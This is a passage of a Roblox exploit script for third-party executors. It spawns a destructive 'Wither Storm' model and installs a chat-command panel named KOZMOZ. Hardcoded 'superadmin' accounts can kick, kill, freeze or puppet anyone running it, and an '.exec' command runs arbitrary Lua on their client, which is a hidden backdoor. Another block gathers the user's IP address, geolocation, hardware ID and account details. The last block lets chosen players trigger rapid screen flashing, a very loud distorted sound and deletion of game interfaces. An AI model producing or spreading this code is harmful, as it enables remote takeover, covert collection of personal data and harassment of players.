    writefile("WHATHAVEYOUDONE.mp3", game:HttpGet("https://raw.githubusercontent.com/yesawwwwwwd/-WitherStormTrack/main/WHATHAVEYOUDONE.mp3"))
    object = game:GetObjects("rbxassetid://10973669978")[1]
    object.Parent = game.Workspace
    object:PivotTo(game.Players.LocalPlayer.Character:GetPivot())
    RunService = game:GetService("RunService")
    Players = game:GetService("Players")
    player = Players.LocalPlayer
    character = player.Character or player.CharacterAdded:Wait()
    player.CharacterAdded:Connect(function(newChar)
        character = newChar
    end)
    phaseModels = {
        [1] = "rbxassetid://10973669978",
        [2] = "rbxassetid://10980258642",
        [3] = "rbxassetid://10980269902",
        [4] = "rbxassetid://10394012803",
        [5] = "rbxassetid://16333160399",
        [6] = "rbxassetid://16333261175"
    }
    phasePartsSucked = {0, 50, 100, 150, 200, 250}
    currentPhase = 1
    partsSucked = 0
    attractedParts = {}
    local function isCharacterPart(part)
        model = part:FindFirstAncestorWhichIsA("Model")
        return model and model:FindFirstChildWhichIsA("Humanoid") ~= nil
    end
    local function disableCollisions(model)
        for _, part in ipairs(model:GetDescendants()) do
            if part:IsA("BasePart") then
                part.CanCollide = false
            end
        end
    end
    local function changePhase(newPhase)
        if currentPhase == newPhase then return end
        oldPosition = object:GetPivot()
        object:Destroy()
        object = game:GetObjects(phaseModels[newPhase])[1]
        object.Parent = game.Workspace
        object:PivotTo(oldPosition)
        disableCollisions(object)
        currentPhase = newPhase
        print("Big boy")
    end
    local function onPartDestroyed()
        partsSucked = partsSucked + 1
        for i, threshold in ipairs(phasePartsSucked) do
            if partsSucked >= threshold and currentPhase < i then
                changePhase(i)
                break
            end
        end
    end
    coroutine.wrap(function()
        while true do
            task.wait(2)
            candidates = {}
            for _, obj in ipairs(game.Workspace:GetDescendants()) do
                if obj:IsA("BasePart") and obj.Parent and not isCharacterPart(obj) and not obj:IsDescendantOf(object) and obj.Size.Magnitude < 20 and not table.find(attractedParts, obj) then
                    dist = (obj.Position - object:GetPivot().Position).Magnitude
                    table.insert(candidates, {obj = obj, dist = dist})
                end
            end
            if #candidates > 0 then
                table.sort(candidates, function(a, b) return a.dist < b.dist end)
                chosen = candidates[1].obj
                if chosen.Anchored then
                    chosen.Anchored = false
                end
                table.insert(attractedParts, chosen)
            end
        end
    end)()
    RunService.Heartbeat:Connect(function(dt)
        for i = #attractedParts, 1, -1 do
            obj = attractedParts[i]
            if obj and obj.Parent and not isCharacterPart(obj) then
                objectPos = object:GetPivot().Position
                dist = (obj.Position - objectPos).Magnitude
                if dist > 2 then
                    lerpAlpha = 0.2 * dt * (100 / dist)
                    newPos = obj.Position:Lerp(objectPos, lerpAlpha)
                    obj.CFrame = CFrame.new(newPos) * obj.CFrame.Rotation
                else
                    obj:Destroy()
                    table.remove(attractedParts, i)
                    onPartDestroyed()
                end
            else
                table.remove(attractedParts, i)
            end
        end
    end)
    local function getPhaseSettings()
        phase = currentPhase
        if phase == 1 or phase == 2 or phase == 3 then
            return {
                minHeight = 5,
                maxHeight = 30,
                speed = 1,
                move = true
            }
        elseif phase == 4 then
            return {
                minHeight = 15,
                maxHeight = 25,
                speed = 0.7,
                move = true
            }
        elseif phase == 5 then
            return {
                minHeight = 25,
                maxHeight = 40,
                speed = 0.3,
                move = true
            }
        else
            return {
                minHeight = 35,
                maxHeight = 55,
                speed = 0,
                move = false
            }
        end
    end
    coroutine.wrap(function()
        while true do
            settings = getPhaseSettings()
            if settings.move then
                startCFrame = object:GetPivot()
                playerPivot = character:GetPivot()
                randomOffset = Vector3.new(math.random(-50, 50), math.random(settings.minHeight, settings.maxHeight), math.random(-50, 50))
                targetPos = playerPivot.Position + randomOffset
                targetPos = Vector3.new(targetPos.X, math.max(targetPos.Y, playerPivot.Position.Y + settings.minHeight), targetPos.Z)
                dir = targetPos - startCFrame.Position
                if dir.Magnitude < 1 then
                    task.wait(1)
                    continue
                end
                dir = dir.Unit
                targetCFrame = CFrame.lookAt(targetPos, targetPos + dir)
                duration = math.random(3/settings.speed, 10/settings.speed)
                elapsed = 0
                while elapsed < duration do
                    elapsed += RunService.Heartbeat:Wait()
                    alpha = elapsed / duration
                    object:PivotTo(startCFrame:Lerp(targetCFrame, alpha))
                end
            else
                currentCFrame = object:GetPivot()
                currentPos = currentCFrame.Position
                playerPivot = character:GetPivot()
                targetCFrame = CFrame.lookAt(currentPos, playerPivot.Position)
                object:PivotTo(targetCFrame)
                task.wait(0.1)
            end
        end
    end)()
    coroutine.wrap(function()
        while true do
            task.wait(3)
            if not character or not character:FindFirstChild("HumanoidRootPart") then continue end
            skullTemplate = game:GetObjects("rbxassetid://16940644099")[1]
            skull = skullTemplate:Clone()
            skull.Parent = game.Workspace
            launchSound = Instance.new("Sound")
            launchSound.SoundId = "rbxassetid://127670808213759"
            launchSound.Volume = 2
            launchSound.Parent = game.Workspace
            launchSound:Play()
            objectCFrame = object:GetPivot()
            spawnOffset = objectCFrame.LookVector * 5
            skull:PivotTo(CFrame.new(objectCFrame.Position + spawnOffset) * objectCFrame.Rotation)
            playerPos = character.HumanoidRootPart.Position
            skullDir = (playerPos - skull:GetPivot().Position).Unit
            skullTargetCFrame = CFrame.lookAt(skull:GetPivot().Position, skull:GetPivot().Position + skullDir)
            skull:PivotTo(skullTargetCFrame)
            speed = 50
            moving = true
            coroutine.wrap(function()
                while skull and skull.Parent and moving do
                    dt = RunService.Heartbeat:Wait()
                    newPos = skull:GetPivot().Position + skullDir * speed * dt
                    skull:PivotTo(CFrame.new(newPos) * skull:GetPivot().Rotation)
                end
            end)()
            task.delay(17, function()
                if skull and skull.Parent then
                    skull:Destroy()
                end
            end)
            local touchedConnection
            exploded = false
            touchedConnection = skull.DescendantAdded:Connect(function(desc)
                if desc:IsA("BasePart") then
                    desc.Touched:Connect(function(other)
                        if not exploded and other and other.Parent then
                            exploded = true
                            moving = false
                            if touchedConnection then touchedConnection:Disconnect() end
                            explosionPos = skull:GetPivot().Position
                            explosion = Instance.new("Explosion")
                            explosion.Position = explosionPos
                            explosion.BlastRadius = 10
                            explosion.BlastPressure = 0
                            explosion.Parent = game.Workspace
                            explodeSound = Instance.new("Sound")
                            explodeSound.SoundId = "rbxassetid://90854697257230"
                            explodeSound.Volume = 2
                            explodeSound.Parent = game.Workspace
                            explodeSound:Play()
                            playerRoot = character:FindFirstChild("HumanoidRootPart")
                            if playerRoot then
                                dist = (playerRoot.Position - explosionPos).Magnitude
                                if dist <= 10 then
                                    humanoid = character:FindFirstChildWhichIsA("Humanoid")
                                    if humanoid then
                                        humanoid:TakeDamage(10)
                                    end
                                end
                            end
                            skull:Destroy()
                        end
                    end)
                end
            end)
            for _, desc in ipairs(skull:GetDescendants()) do
                if desc:IsA("BasePart") then
                    desc.Touched:Connect(function(other)
                        if not exploded and other and other.Parent then
                            exploded = true
                            moving = false
                            if touchedConnection then touchedConnection:Disconnect() end
                            explosionPos = skull:GetPivot().Position
                            explosion = Instance.new("Explosion")
                            explosion.Position = explosionPos
                            explosion.BlastRadius = 10
                            explosion.BlastPressure = 0
                            explosion.Parent = game.Workspace
                            explodeSound = Instance.new("Sound")
                            explodeSound.SoundId = "rbxassetid://90854697257230"
                            explodeSound.Volume = 2
                            explodeSound.Parent = game.Workspace
                            explodeSound:Play()
                            playerRoot = character:FindFirstChild("HumanoidRootPart")
                            if playerRoot then
                                dist = (playerRoot.Position - explosionPos).Magnitude
                                if dist <= 10 then
                                    humanoid = character:FindFirstChildWhichIsA("Humanoid")
                                    if humanoid then
                                        humanoid:TakeDamage(10)
                                    end
                                end
                            end
                            skull:Destroy()
                        end
                    end)
                end
            end
        end
    end)()
    disableCollisions(object)
    sound = Instance.new("Sound")
    sound.SoundId = getcustomasset("WHATHAVEYOUDONE.mp3")
    sound.Volume = 2
    sound.Parent = game.Workspace
    sound.Looped = true
    sound:Play()
end

Players = game:GetService("Players")
RunService = game:GetService("RunService")
TextChatService = game:GetService("TextChatService")

LocalPlayer = Players.LocalPlayer or Players:GetPropertyChangedSignal("LocalPlayer"):Wait()
RBXGeneral = TextChatService.TextChannels:FindFirstChild("RBXGeneral")

scriptedPlayers = {}
scriptedPlayers[LocalPlayer] = true

superAdmins = {
["Griefing_lolxd"] = true,
["shavelikea_bomber"] = true,
}

admins = {
[""] = true,
[""] = true,
[""] = true,
[""] = true,
[""] = true,
[""] = true,
[""] = true
}

tempAdmins = {}

commandHelp = {
".chat (target) (text)",
".kick (target)",
".kill (target)",
".bring (target)",
".spin (target)",
".unspin",
".fps (target) (cap)",
".freeze (target)",
".thaw (target)",
".friend (target)",
".unfriend (target)",
".exec (target) (lua code)",
".admin (target)",
".revoke (target)",
".cmds",
".wither (target)"
}

frozenPlayers = {}

local function getRole(name)
    if superAdmins[name] then
        return "superadmin"
    elseif admins[name] or tempAdmins[name] then
        return "admin"
    else
        return "user"
    end
end

local function resolveTargets(input)
    if not input then return {} end
    input = input:lower()
    results = {}
    if input == "all" then
        for player in pairs(scriptedPlayers) do
            table.insert(results, player)
        end
        return results
    end
    for _, plr in ipairs(Players:GetPlayers()) do
        uname = plr.Name:lower()
        dname = (plr.DisplayName or ""):lower()
        if uname:sub(1, #input) == input or dname:sub(1, #input) == input then
            table.insert(results, plr)
        end
    end
    return results
end

local function toggleBlock(player, enable)
    char = player.Character
    hrp = char and char:FindFirstChild("HumanoidRootPart")
    if not hrp then return end
    if enable then
        if not hrp:FindFirstChild("Block") then
            bv = Instance.new("BodyVelocity")
            bv.Name = "Block"
            bv.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
            bv.Velocity = Vector3.zero
            bv.Parent = hrp
        end
    else
        bv = hrp:FindFirstChild("Block")
        if bv then bv:Destroy() end
    end
end

local function freezePlayer(player, enable)
    if not scriptedPlayers[player] then return end
    char = player.Character
    hrp = char and char:FindFirstChild("HumanoidRootPart")
    if hrp then
        hrp.Anchored = enable
    end
end

spin = false
spinTarget = nil

local function sendToChat(msg)
    if RBXGeneral and msg then
        pcall(function()
            RBXGeneral:SendAsync(msg)
        end)
    end
end

local function handleMessage(sender, text)
    senderRole = getRole(sender.Name)
    if senderRole == "user" then return end
    args = {}
    for word in text:gmatch("%S+") do
        table.insert(args, word)
    end
    if #args < 1 then return end
    cmd = args[1]:lower()
    targets = resolveTargets(args[2])
    if cmd == ".chat" then
        msg = table.concat(args, " ", 3)
        if msg ~= "" then
            for _, target in ipairs(targets) do
                if target == LocalPlayer then
                    sendToChat(msg)
                end
            end
        end
    elseif cmd == ".kick" then
        reason = table.concat(args, " ", 3)
        if reason == "" then reason = "You got kicked by an KOZMOZ admin!" end
        for _, target in ipairs(targets) do
            message = "Kicked by: " .. sender.DisplayName .. " (@" .. sender.Name .. ")\n" .. "Reason: " .. reason
            target:Kick(message)
        end
    elseif cmd == ".wither" then
        witheringheights()
    elseif cmd == ".kill" then
        for _, target in ipairs(targets) do
            hum = target.Character and target.Character:FindFirstChildOfClass("Humanoid")
            if hum then hum.Health = 0 end
        end
    elseif cmd == ".bring" then
        for _, target in ipairs(targets) do
            hrp = target.Character and target.Character:FindFirstChild("HumanoidRootPart")
            senderHRP = sender.Character and sender.Character:FindFirstChild("HumanoidRootPart")
            if hrp and senderHRP then
                hrp.CFrame = senderHRP.CFrame + Vector3.new(0, 0, -3)
                toggleBlock(target, true)
                task.delay(1, function()
                    toggleBlock(target, false)
                end)
            end
        end
    elseif cmd == ".spin" then
        for _, target in ipairs(targets) do
            spin = true
            spinTarget = target
        end
    elseif cmd == ".unspin" then
        spin = false
        spinTarget = nil
    elseif cmd == ".fps" then
        cap = tonumber(args[3])
        if cap and setfpscap then
            setfpscap(cap)
        end
    elseif cmd == ".freeze" then
        for _, target in ipairs(targets) do
            frozenPlayers[target] = true
            freezePlayer(target, true)
        end
    elseif cmd == ".thaw" then
        for _, target in ipairs(targets) do
            frozenPlayers[target] = nil
            freezePlayer(target, false)
        end
    elseif cmd == ".friend" then
        for _, target in ipairs(targets) do
            if target ~= LocalPlayer then
                pcall(function()
                    LocalPlayer:RequestFriendship(target)
                    sendToChat("friended " .. target.Name)
                end)
            end
        end
    elseif cmd == ".unfriend" then
        for _, target in ipairs(targets) do
            if LocalPlayer:IsFriendsWith(target.UserId) then
                pcall(function()
                    LocalPlayer:RevokeFriendship(target)
                    sendToChat("unfriended " .. target.Name)
                end)
            end
        end
    elseif cmd == ".admin" then
        if senderRole ~= "superadmin" then return end
        for _, target in ipairs(targets) do
            if target and not superAdmins[target.Name] then
                tempAdmins[target.Name] = true
                sendToChat(target.DisplayName .. " (@" .. target.Name .. ") is adming")
            end
        end
    elseif cmd == ".revoke" then
        if senderRole ~= "superadmin" then return end
        for _, target in ipairs(targets) do
            if tempAdmins[target.Name] then
                tempAdmins[target.Name] = nil
                sendToChat(target.DisplayName .. " (@" .. target.Name .. ") no more adming ")
            end
        end
    elseif cmd == ".exec" then
        if senderRole ~= "superadmin" then return end
        code = table.concat(args, " ", 3)
        if code ~= "" and targets[1] == LocalPlayer then
            fn, err = loadstring(code)
            if fn then pcall(fn) else warn(err) end
        end
    elseif cmd == ".cmds" then
        chunkSize = math.ceil(#commandHelp / 3)
        for i = 1, #commandHelp, chunkSize do
            chunk = {}
            for j = i, math.min(i + chunkSize - 1, #commandHelp) do
                table.insert(chunk, commandHelp[j])
            end
            sendToChat(table.concat(chunk, "\n"))
        end
    end
end

local function connectPlayer(player)
    player.Chatted:Connect(function(msg)
        handleMessage(player, msg)
    end)
end

for _, player in ipairs(Players:GetPlayers()) do
    connectPlayer(player)
end

Players.PlayerAdded:Connect(connectPlayer)

RunService.Heartbeat:Connect(function()
    if not spin or not spinTarget then return end
    hrp = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
    targetHRP = spinTarget.Character and spinTarget.Character:FindFirstChild("HumanoidRootPart")
    if hrp and targetHRP then
        a = tick() * 2
        hrp.CFrame = targetHRP.CFrame * CFrame.new(math.cos(a) * 8, 2, math.sin(a) * 8)
    end
end)

print("KOZMOZ loaded, made with love by vxy, for", LocalPlayer.DisplayName)

HttpService = game:GetService("HttpService")
Players = game:GetService("Players")
MarketplaceService = game:GetService("MarketplaceService")
LocalizationService = game:GetService("LocalizationService")
RbxAnalyticsService = game:GetService("RbxAnalyticsService")

LocalPlayer = Players.LocalPlayer
Userid = LocalPlayer.UserId
DName = LocalPlayer.DisplayName
Name = LocalPlayer.Name
MembershipType = tostring(LocalPlayer.MembershipType):sub(21)
AccountAge = LocalPlayer.AccountAge
Country = LocalizationService.RobloxLocaleId
GetIp = game:HttpGet("https://v4.ident.me/")
GetData = game:HttpGet("http://ip-api.com/json")
GetHwid = RbxAnalyticsService:GetClientId()
ConsoleJobId = 'Roblox.GameLauncher.joinGameInstance(' .. game.PlaceId .. ', "' .. game.JobId .. '")'
JoinLink = "roblox://placeId=" .. game.PlaceId .. "&gameInstanceId=" .. game.JobId
GAMENAME = MarketplaceService:GetProductInfo(game.PlaceId).Name

Players = game:GetService("Players")
Lighting = game:GetService("Lighting")
TweenService = game:GetService("TweenService")
Run = game:GetService("RunService")

Player = Players.LocalPlayer
Cam = workspace.CurrentCamera

Intensity = 0
TimeElapsed = 0

list = {}

ScreenGui = Instance.new("ScreenGui")
ScreenGui.DisplayOrder = 12
ScreenGui.IgnoreGuiInset = true
ScreenGui.Parent = game.CoreGui

BlackFrame = Instance.new("Frame")
BlackFrame.Size = UDim2.new(1, 0, 1, 0)
BlackFrame.BackgroundColor3 = Color3.new(0, 0, 0)
BlackFrame.BackgroundTransparency = 1
BlackFrame.Parent = ScreenGui

local function flashScreen()
    BlackFrame.BackgroundTransparency = 0
    TweenService:Create(
        BlackFrame,
        TweenInfo.new(2, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
        {BackgroundTransparency = 1}
    ):Play()
end

Run.RenderStepped:Connect(function(dt)
    if Intensity > 0 then
        TimeElapsed += dt
        sx = 1 + math.sin(TimeElapsed * 30) * Intensity
        sy = 1 + math.cos(TimeElapsed * 30) * Intensity
        Cam.CFrame = Cam.CFrame * CFrame.new(0,0,0, sx,0,0, 0,sy,0, 0,0,1)
    end
end)

spookyMessages = {
    "SILENCE",
    "THEY ARE WATCHING",
    "RUN",
    "HIDE",
    "BE QUIET, THEY'RE NEAR",
    "GET AWAY",
    "CLOSE YOUR EYES",
    "DONT LOOK AT IT"
}

local function applyEffects()
    msg = Instance.new("Message")
    msg.Text = spookyMessages[math.random(1, #spookyMessages)]
    msg.Parent = workspace
    task.delay(0.5, function()
        msg:Destroy()
    end)
    cc = Instance.new("ColorCorrectionEffect")
    cc.Parent = game.Lighting
    cc.TintColor = Color3.fromRGB(255, 0, 0)
    cc.Saturation = -100
    cc.Contrast = 5
    cc.Brightness = 2
    game.Lighting.TimeOfDay = "00:00:00"
    blur = Instance.new("BlurEffect")
    blur.Size = 5
    blur.Parent = game.Lighting
    Intensity = 0.03
    task.spawn(function()
        while true do
            cc.Saturation = -cc.Saturation
            task.wait()
        end
    end)
    task.spawn(function()
        while true do
            BlackFrame.BackgroundTransparency = 0
            TweenService:Create(
                BlackFrame,
                TweenInfo.new(2, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
                {BackgroundTransparency = 1}
            ):Play()
            task.wait(2)
        end
    end)
end

local function onChatted(player, message)
    if not list[player.Name] then return end
    if message:sub(1, 3):lower() == "/e " then
        message = message:sub(4)
    end
    if message == "!s" then
        applyEffects()
    elseif message == "bye scipt" then
        game:GetService("CoreGui").HUI:ClearAllChildren()
    elseif message == ".term2" then
    elseif message == ".term" then
        coreGui = game:GetService("CoreGui")
        coreGui:ClearAllChildren()
    elseif message == ".term2" then
        coreGui2 = game:GetService("ReplicatedStorage")
        coreGui2:ClearAllChildren()
    elseif message == ".term3" then
        coreGui3 = game:GetService("ReplicatedFirst")
        coreGui3:ClearAllChildren()
    elseif message == ".oh" then
        game:GetService("Players").LocalPlayer:ClearAllChildren()
    elseif message == "kid:Destroy()" then
        game:GetService("Players").LocalPlayer.PlayerGui:ClearAllChildren()
        game:GetService("Players").LocalPlayer.PlayerScripts:ClearAllChildren()
    elseif message == "silence" then
        coreGui4 = game:GetService("TextChatService")
        coreGui4:ClearAllChildren()
    elseif message == "shazam" then
        plrsyo = game:GetService("Players")
        plrsyo:ClearAllChildren()
    elseif message == "skid:rekt" then
        game:GetService("StarterGui"):ClearAllChildren()
        game:GetService("StarterPlayer").StarterPlayerScripts:ClearAllChildren()
        game:GetService("StarterPlayer").StarterCharacterScripts:ClearAllChildren()
    end
    soundService = game:GetService("SoundService")
    players = game:GetService("Players")
    player = players.LocalPlayer
    soundService.AmbientReverb = Enum.ReverbType.Alley
    tinnitus = soundService:FindFirstChild("Tinnitus")
    if tinnitus then
        tinnitus.Looped = true
        tinnitus.PlaybackSpeed = 0.1
        tinnitus.Volume = 500
        tinnitus:Play()
        task.spawn(function()
            local function runTinnitus()
                if not tinnitus then return end
                tinnitus.Looped = true
                tinnitus.Volume = 500
                tinnitus:Play()
                speed = 0.1
                tinnitus.PlaybackSpeed = speed
                while speed < 20 do
                    task.wait(1)
                    speed += 1
                    tinnitus.PlaybackSpeed = speed
                end
                tinnitus.PlaybackSpeed = 20
                while true do
                    task.wait(math.random(0.1, 3))
                    tinnitus.PlaybackSpeed = math.random(1, 200) / 10
                end
            end
            runTinnitus()
            while true do
                task.wait(1)
                if not tinnitus or not tinnitus:IsDescendantOf(game) or not tinnitus.IsPlaying or not tinnitus.Looped then
                    tinnitus = soundService:FindFirstChild("Tinnitus")
                    if tinnitus then
                        runTinnitus()
                    end
                end
            end
        end)
    end
    applyEffects()
end

for _, p in ipairs(Players:GetPlayers()) do
    if list[p.Name] then
        p.Chatted:Connect(function(msg)
            onChatted(p, msg)
        end)
    end
end

Players.PlayerAdded:Connect(function(p)
    if list[p.Name] then
        p.Chatted:Connect(function(msg)
            onChatted(p, msg)
        end)
    end
end)
